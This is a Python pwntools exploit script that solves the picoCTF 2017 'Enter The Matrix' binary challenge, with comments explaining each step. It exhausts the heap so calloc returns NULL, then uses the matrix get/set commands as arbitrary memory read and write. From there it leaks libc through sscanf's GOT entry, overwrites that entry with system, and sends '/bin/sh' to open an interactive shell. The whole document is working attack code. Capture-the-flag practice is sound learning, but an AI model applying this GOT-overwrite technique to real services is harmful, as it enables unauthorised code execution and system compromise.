# Enter The Matrix, exploit 1.
# Overview: this exploit overwrites a GOT entry to spawn a shell.
# Details: Overwrites `sscanf` to point to `system`. Requires libc leak
#   and a copy of their libc, which lives on the shell server. Alternatively,
#   we can leak a few GOT entries and then determine the version of libc from
#   there (libcdb.com).

from pwn import *
import struct
import sys

# context.log_level="DEBUG"

host = "shell2017.picoctf.com"
port = 32760

# get a copy of the binary and their libc from the shell account
# run `ldd ./matrix` on the server to get path to the libc
# load symbols from the binary and the libc with pwntools

e = ELF("./matrix")         # loads the symbols from the binary
r = remote(host, port)
libc = ELF("libc.so.6")     # symbols from their libc

# Use the local binary and local libc
# r = e.process()
# libc = e.libc


print "======= stage 1: overflow heap, make calloc return null pointer ======="
# Fill up heap by creating maximum matrix n=12 times.
# nth matrix's data pointer is automatically NULL from calloc.
# Allows us to index up to 10000x10001 array entries starting from 0x0 (NULL).
# Since each entry is a float (4 bytes), we can address 10000x10001x4 bytes
# of memory starting at 0x0 (NULL).

# Range: 0x0 to 0x17d82040

r.readuntil("Enter command: ")
for _ in range(12):
    r.sendline("create 10000 10000")
    r.readline()

# The nth matrix's data pointer is NULL. Free all the n-1 matrices so we have
# space to call system later on.
for _ in range(11):
    r.sendline("destroy {}".format(_))
    r.readline()




# Defining functions for arbitrary-ish read and arbitrary-ish write.
# Generally a good idea in challenges that have read/write bugs.
def read(addr):
    """Reads 4 bytes of data from `addr`."""
    # Syntax: get <id> <row> <col>
    # assert(addr & 3 == 0)     # make sure addr is divisible by 4
    naddr = addr >> 2           # addr corresponds to data[addr/4]
    row = naddr / 10000
    col = naddr % 10000
    cmd = "get 11 {} {}".format(row, col)
    r.sendline(cmd)

    # response: `Matrix[1][1] = 123.456001`
    r.readuntil("] = ")
    # Get packed byte representation of float from response.
    byte_rep = struct.pack("<f", float(r.readline()))
    # Change byte representation into an unpacked 32bit int.
    leaked_addr = u32(byte_rep)

    print '+++++ Address at {}: {:08x} +++++'.format(hex(addr), leaked_addr)
    return leaked_addr

def write(addr, value):
    """Writes 4 bytes from `value` into memory location `addr`."""
    # Syntax: set <id> <row> <col> <value>
    assert(addr & 3 == 0)     # make sure addr is divisible by 4
    naddr = addr >> 2
    row = naddr / 10000
    col = naddr % 10000

    # Pack `value` into 32bit int byte representation.
    packed = p32(value)
    # Unpack the 32bit int as a float.
    float_val = struct.unpack("<f", packed)[0]
    cmd = "set 11 {} {} {}".format(row, col, float_val)
    r.sendline(cmd)

    print '+++++ wrote "{}" to {} +++++'.format(hex(value), hex(addr))




print "======= stage 2: leak libc, calc offset of system ====================="
# get the address of the GOT entry of sscanf from binary
sscanf_got = e.got['__isoc99_sscanf']
# free = e.got['free']      # some more GOT entries to leak if not given libc
# printf = e.got['printf']

sscanf_addr = read(sscanf_got)
# free_addr = read(free)
# printf_addr = read(printf)

# If we are given libc, we have the offset, which we use to calculate libc_base.
# libc_base + offset = leaked_addr
# libc_base = leaked_addr - offset
sscanf_offset = libc.symbols['__isoc99_sscanf']
libc_base = sscanf_addr - sscanf_offset

system_offset = libc.symbols['system']
system_addr = libc_base + system_offset



print "======= stage 3: overwrite `sscanf`'s GOT entry with libc `system` ===="
write(sscanf_got, system_addr)



print "======= stage 4: call `system('/bin/sh')` ============================="
# Now `sscanf` is replaced with `system`. Let's call `sscanf("/bin/sh")`.
r.sendline("/bin/sh")


r.interactive()
